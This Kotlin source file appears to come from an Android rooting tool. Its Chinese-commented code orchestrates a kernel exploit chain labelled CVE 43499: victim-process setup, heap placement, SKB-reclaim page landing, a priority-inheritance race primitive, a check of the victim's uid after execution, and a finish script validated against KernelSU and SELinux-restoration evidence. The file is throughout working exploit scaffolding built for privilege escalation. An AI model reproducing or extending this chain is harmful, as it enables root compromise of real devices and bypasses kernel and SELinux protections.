package com.ghostlock.app.backend.cve43499.run

import com.ghostlock.app.backend.cve43499.finish.AndroidFinishEvidenceSource
import com.ghostlock.app.backend.cve43499.finish.FinishAcceptance
import com.ghostlock.app.backend.cve43499.finish.FinishAcceptanceInput
import com.ghostlock.app.backend.cve43499.finish.FinishCommandSource
import com.ghostlock.app.backend.cve43499.finish.FinishEvidenceSource
import com.ghostlock.app.backend.cve43499.finish.FinishExecutionEvidence
import com.ghostlock.app.backend.cve43499.finish.FinishHandoff
import com.ghostlock.app.backend.cve43499.finish.FinishVerdict
import com.ghostlock.app.backend.cve43499.finish.ProcessBuilderFinishCommandSource
import com.ghostlock.app.backend.cve43499.finish.RunBindingEvidence
import com.ghostlock.app.backend.cve43499.owned.ActorOwner
import com.ghostlock.app.backend.cve43499.owned.ActorPreparation
import com.ghostlock.app.backend.cve43499.owned.ActorPrepareOutcome
import com.ghostlock.app.backend.cve43499.owned.ActorExecuteOutcome
import com.ghostlock.app.backend.cve43499.owned.LandingConfig
import com.ghostlock.app.backend.cve43499.owned.LandingOutcome
import com.ghostlock.app.backend.cve43499.owned.OwnerCloseOutcome
import com.ghostlock.app.backend.cve43499.owned.PageOwner
import com.ghostlock.app.backend.cve43499.owned.PlacementConfig
import com.ghostlock.app.backend.cve43499.owned.PlacementOwner
import com.ghostlock.app.backend.cve43499.owned.PlacementPrepareOutcome
import com.ghostlock.app.backend.cve43499.victim.ProcessVictimSession
import com.ghostlock.app.backend.cve43499.victim.VictimIdentity
import com.ghostlock.app.backend.cve43499.victim.VictimSession
import com.ghostlock.app.backend.cve43499.victim.VictimUidResult

/**
 * 一次 43499 运行的显式输入：全部物理参数 + UI 生成的收尾交接对象。
 *
 * @property placement Placement 定位事务参数（CPU/超时/扫描窗口/对齐）。
 * @property landing landing 参数与最终字节（长度必须等于 Native SKB 闭包）。
 * @property actor Actor 调度与已绑定的 Carrier。
 * @property handoff UI 生成的收尾脚本冻结对象；后端只读、不生成/不选择/不解释脚本。
 * @property runId 本次运行 id；marker 内容、执行证据与 victim 绑定都以它为键。
 * @note 本对象不含 profile、route、步骤表或 retry/fallback 策略。
 */
internal data class Cve43499RunConfig(
    val placement: PlacementConfig,
    val landing: LandingConfig,
    val actor: ActorPreparation,
    val handoff: FinishHandoff,
    val runId: String,
)

/**
 * 一次运行的物理事实回执（不含任何业务成功主张）。
 *
 * @property placementRounds Placement 实际测量轮数。
 * @property landingReclaimSends landing 实际 reclaim sendmsg 次数。
 * @property actorConsumerSuccess execute 窗口内 consumer 成功计数。
 * @property victimUid victim 读回的 uid；null 表示没有证据。
 * @property victimStartTimeTicks execute 前采集的 victim starttime（绑定证据）。
 * @property executionExitCode 收尾脚本实际退出码；null 表示未执行/未拿到。
 * @property termination 终结证据：Actor/Page/Placement/victim 的具名结局。
 * @property verdict 收尾验收结论（全部证据齐备才是 Accepted）。
 */
internal data class Cve43499RunReceipts(
    val runId: String,
    val placementRounds: Long,
    val landingReclaimSends: Long,
    val actorConsumerSuccess: Long,
    val victimUid: Long?,
    val victimStartTimeTicks: Long?,
    val executionExitCode: Int?,
    val termination: String,
    val verdict: FinishVerdict,
)

/** 一次运行的具名结局；Refused 必须带非空 reasons。 */
internal sealed interface Cve43499RunOutcome {
    /** 全部证据齐备且验收 Accepted。 */
    data class Completed(val receipts: Cve43499RunReceipts) : Cve43499RunOutcome

    /** 具名拒绝：运行链路失败原因 + 收尾验收缺失项（都稳定可检索）。 */
    data class Refused(
        val reasons: List<String>,
        val receipts: Cve43499RunReceipts,
    ) : Cve43499RunOutcome
}

/**
 * 43499 的显式编排：PlacementOwner → PageOwner → ActorOwner → victim → finish 验收。
 *
 * 不接默认 Flow/UI 入口、不注册全局对象、不做 retry/fallback：调用方必须显式构造
 * 本类并传入 [Cve43499RunConfig]；任何失败都以具名 reason 返回，不伪造成功。
 *
 * 资源纪律：
 * - 成功链：Placement→Page→Actor 转移后只有一个 owner 存活，close 顺序 Actor→Page→Placement；
 * - 中途 clean failure：未转移的 owner 由本类按同一次序 close；
 * - dirty/retained：Native 保留闭包到进程退出，本类不猜测回收；
 * - victim 进程最后 close（有界、幂等）。
 *
 * @param config 显式输入。
 * @param victimFactory victim 会话工厂 seam（宿主验证可注入 fake）。
 * @param evidenceSource 收尾验收证据源 seam。
 * @param finishExecutor 收尾脚本的有界执行 seam（UI 侧 `FinishExecution` 注入；
 *   默认返回「未执行」证据 ⇒ 验收必然 `finish-execution-missing`，不会伪成功）。
 * @param commandSource ksud 证据的有界命令 seam。
 * @param log 里程碑日志回调；不得用于判定成功。
 * @note 阶段：G4L-6 run + F-D（真机门禁前不接生产入口）。
 */
internal class Cve43499Run(
    private val config: Cve43499RunConfig,
    private val victimFactory: () -> VictimSession = { ProcessVictimSession() },
    private val evidenceSource: FinishEvidenceSource = AndroidFinishEvidenceSource,
    private val finishExecutor: (FinishHandoff, String) -> FinishExecutionEvidence = { handoff, runId ->
        FinishExecutionEvidence(
            runId = runId,
            exitCode = null,
            timedOut = false,
            outputDigestSha256 = null,
            successMarkerContent = null,
            failureMarkerContent = null,
        )
    },
    private val commandSource: FinishCommandSource = ProcessBuilderFinishCommandSource,
    private val log: (String) -> Unit = {},
) {
    /**
     * 执行一次完整链路并返回具名结论。
     *
     * @return [Cve43499RunOutcome.Completed] 仅在 uid/脚本对象身份/ksud/marker/
     *   SELinux 恢复/资源终结全部齐备时出现；其余为具名 [Cve43499RunOutcome.Refused]。
     * @note 本函数不抛异常：所有失败映射为具名 reason；victim 与 owner 链在 finally 收尾。
     */
    fun run(): Cve43499RunOutcome {
        var placement: PlacementOwner? = null
        var page: PageOwner? = null
        var actor: ActorOwner? = null
        var victim: VictimSession? = null
        var refusal: String? = null
        var observedUid: Long? = null
        var victimIdentityBefore: VictimIdentity? = null
        var victimIdentityAfter: VictimIdentity? = null
        var execution: FinishExecutionEvidence? = null
        var placementRounds = 0L
        var landingReclaimSends = 0L
        var actorConsumerSuccess = 0L
        var resourcesReleased = false
        var termination = "not-attempted"

        try {
            /* 1. victim 先启动：内核写入窗口期间目标进程必须存在。 */
            val session = try {
                victimFactory().also { victim = it }
            } catch (problem: Throwable) {
                null
            }
            if (session == null) {
                refusal = "victim-start:create"
            } else {
                when (val started = session.startDetailed()) {
                    is com.ghostlock.app.backend.cve43499.victim.VictimStartResult.Failed ->
                        refusal = started.reason
                    else -> {
                        log("cve43499-run:victim-started")
                        /* F-D：execute 之前必须捕获 victim 身份（PID/starttime/uid）。 */
                        victimIdentityBefore = session.identity()
                        if (victimIdentityBefore == null) {
                            refusal = "victim-identity-missing"
                        }
                    }
                }
            }

            /* 2. Placement 定位事务。 */
            if (refusal == null) {
                when (val prepared = PlacementOwner.prepare(config.placement)) {
                    is PlacementPrepareOutcome.Prepared -> {
                        placement = prepared.owner
                        placementRounds = prepared.receipt.measurementRounds
                        log("cve43499-run:placement-ok")
                    }
                    is PlacementPrepareOutcome.Refused ->
                        refusal = "placement:" + prepared.reason
                }
            }

            /* 3. landing：Placement → Page。 */
            val placementOwner = placement
            if (refusal == null && placementOwner != null) {
                when (val landed = placementOwner.landPage(config.landing)) {
                    is LandingOutcome.Landed -> {
                        page = landed.owner
                        landingReclaimSends = landed.receipt.reclaimSendCount
                        placement = null
                        log("cve43499-run:landing-ok")
                    }
                    is LandingOutcome.ReceiptIncomplete ->
                        refusal = "landing:receipt-incomplete"
                    is LandingOutcome.CleanFailure -> refusal = "landing:clean-failure"
                    is LandingOutcome.ConsumedDirty -> {
                        placement = null
                        refusal = "landing:dirty"
                    }
                    LandingOutcome.NotAccepted -> refusal = "landing:not-accepted"
                    is LandingOutcome.Rejected -> refusal = "landing:" + landed.reason
                }
            }

            /* 4. prepareActor：Page → Actor。 */
            val pageOwner = page
            if (refusal == null && pageOwner != null) {
                when (val preparedActor = pageOwner.prepareActor(config.actor)) {
                    is ActorPrepareOutcome.Prepared -> {
                        actor = preparedActor.owner
                        page = null
                        log("cve43499-run:actor-prepared:" + preparedActor.receipt.primitiveKind)
                    }
                    is ActorPrepareOutcome.ReceiptIncomplete ->
                        refusal = "prepare-actor:receipt-incomplete"
                    is ActorPrepareOutcome.CleanFailure ->
                        refusal = "prepare-actor:clean-failure"
                    is ActorPrepareOutcome.ConsumedDirty -> {
                        page = null
                        refusal = "prepare-actor:dirty"
                    }
                    ActorPrepareOutcome.NotAccepted -> refusal = "prepare-actor:not-accepted"
                    is ActorPrepareOutcome.Rejected ->
                        refusal = "prepare-actor:" + preparedActor.reason
                }
            }

            /* 5. execute：唯一一次 PI 窗口。 */
            val actorOwner = actor
            if (refusal == null && actorOwner != null) {
                when (val executed = actorOwner.execute()) {
                    is ActorExecuteOutcome.Executed -> {
                        actorConsumerSuccess = executed.receipt.consumerSuccessCount
                        log("cve43499-run:actor-executed")
                    }
                    is ActorExecuteOutcome.ReceiptIncomplete ->
                        refusal = "actor-execute:receipt-incomplete"
                    is ActorExecuteOutcome.CleanFailure ->
                        refusal = "actor-execute:clean-failure"
                    is ActorExecuteOutcome.Dirty -> refusal = "actor-execute:dirty"
                    ActorExecuteOutcome.NotAccepted -> refusal = "actor-execute:not-accepted"
                    is ActorExecuteOutcome.Rejected ->
                        refusal = "actor-execute:" + executed.reason
                }
            }

            /* 6. execute 之后复查 victim starttime：进程未被替换才算绑定成立。 */
            val sessionForBinding = victim
            if (refusal == null && sessionForBinding != null) {
                victimIdentityAfter = sessionForBinding.identity()
                if (victimIdentityAfter == null) {
                    refusal = "victim-identity-missing-after-execute"
                } else if (victimIdentityBefore != null &&
                    victimIdentityAfter.startTimeTicks !=
                    victimIdentityBefore.startTimeTicks
                ) {
                    refusal = "victim-starttime-changed"
                }
            }

            /* 7. victim uid 探测（有界；只做证据，不宣布成功）。 */
            val sessionForProbe = victim
            if (refusal == null && sessionForProbe != null) {
                when (val probe = sessionForProbe.uid()) {
                    is VictimUidResult.Ok -> observedUid = probe.uid
                    is VictimUidResult.Failed -> refusal = probe.reason
                }
            }

            /* 8. 实际执行收尾脚本（有界）；只在攻击链成功时执行生产脚本。 */
            if (refusal == null) {
                execution = finishExecutor(config.handoff, config.runId)
                log("cve43499-run:finish-executed:" + (execution?.exitCode ?: -1))
            }
        } finally {
            var allReleased = true
            val note = StringBuilder()
            actor?.let { owner ->
                val outcome = closeSafely { owner.closeDetailed() }
                note.append("actor=").append(closeName(outcome)).append(';')
                if (outcome !is OwnerCloseOutcome.Released) allReleased = false
            } ?: note.append("actor=skipped;")
            page?.let { owner ->
                val outcome = closeSafely { owner.closeDetailed() }
                note.append("page=").append(closeName(outcome)).append(';')
                if (outcome !is OwnerCloseOutcome.Released) allReleased = false
            } ?: note.append("page=skipped;")
            placement?.let { owner ->
                val outcome = closeSafely { owner.closeDetailed() }
                note.append("placement=").append(closeName(outcome)).append(';')
                if (outcome !is OwnerCloseOutcome.Released) allReleased = false
            } ?: note.append("placement=skipped;")
            val victimClosed = victim?.let { runCatching { it.close() }.isSuccess } ?: true
            if (victimClosed) {
                note.append("victim=closed;")
            } else {
                note.append("victim=close-threw;")
                allReleased = false
            }
            resourcesReleased = allReleased
            termination = note.toString()
        }

        val binding = buildBinding(victimIdentityBefore, victimIdentityAfter)
        val verdict = FinishAcceptance.evaluate(
            FinishAcceptanceInput(
                runId = config.runId,
                observedUid = observedUid,
                handoff = config.handoff,
                resourcesReleased = resourcesReleased,
                execution = execution,
                binding = binding,
                source = evidenceSource,
                commandSource = commandSource,
            ),
        )
        val receipts = Cve43499RunReceipts(
            runId = config.runId,
            placementRounds = placementRounds,
            landingReclaimSends = landingReclaimSends,
            actorConsumerSuccess = actorConsumerSuccess,
            victimUid = observedUid,
            victimStartTimeTicks = victimIdentityBefore?.startTimeTicks,
            executionExitCode = execution?.exitCode,
            termination = termination,
            verdict = verdict,
        )
        val chainRefusal = refusal
        if (chainRefusal != null) {
            val verifyReasons = (verdict as? FinishVerdict.Refused)?.reasons.orEmpty()
            return Cve43499RunOutcome.Refused(listOf(chainRefusal) + verifyReasons, receipts)
        }
        return when (verdict) {
            FinishVerdict.Accepted -> Cve43499RunOutcome.Completed(receipts)
            is FinishVerdict.Refused -> Cve43499RunOutcome.Refused(verdict.reasons, receipts)
        }
    }

    /**
     * 构造 victim ↔ Actor 的可审计绑定证据。
     *
     * @param before execute 前采集的 victim 身份。
     * @param after execute 后复查的 victim 身份。
     * @return 绑定证据；任一侧缺失返回 null（验收按 `finish-binding-missing` 拒绝）。
     * @note 最终地址来自 prepare 时绑定的 PrimitiveSpec；Native 不重算地址。
     */
    private fun buildBinding(
        before: VictimIdentity?,
        after: VictimIdentity?,
    ): RunBindingEvidence? {
        if (before == null || after == null) return null
        val primitive = config.actor.primitive
        return RunBindingEvidence(
            runId = config.runId,
            victim = before,
            primitiveWaiterAddress = primitive.finalWaiterAddress,
            primitiveTaskAddress = primitive.finalTaskAddress,
            primitiveLockAddress = primitive.finalLockAddress,
            victimStartTimeAfterExecute = after.startTimeTicks,
        )
    }

    /**
     * 把 close 调用包成不抛异常的形式；异常映射为具名 Rejected。
     *
     * @param block owner 的 closeDetailed 调用。
     * @return 具名 close 结局；异常时为 Rejected("close-threw:...")。
     */
    private fun closeSafely(block: () -> OwnerCloseOutcome): OwnerCloseOutcome =
        runCatching(block).getOrElse { problem ->
            OwnerCloseOutcome.Rejected(
                "close-threw:" + (problem.message ?: problem.javaClass.simpleName),
            )
        }

    /**
     * @param outcome close 结局。
     * @return 稳定可检索的终结证据名。
     */
    private fun closeName(outcome: OwnerCloseOutcome): String = when (outcome) {
        is OwnerCloseOutcome.Released -> "released"
        is OwnerCloseOutcome.Retained -> "retained"
        is OwnerCloseOutcome.ReceiptIncomplete -> "receipt-incomplete"
        OwnerCloseOutcome.NotAccepted -> "not-accepted"
        is OwnerCloseOutcome.Rejected -> "rejected"
    }
}
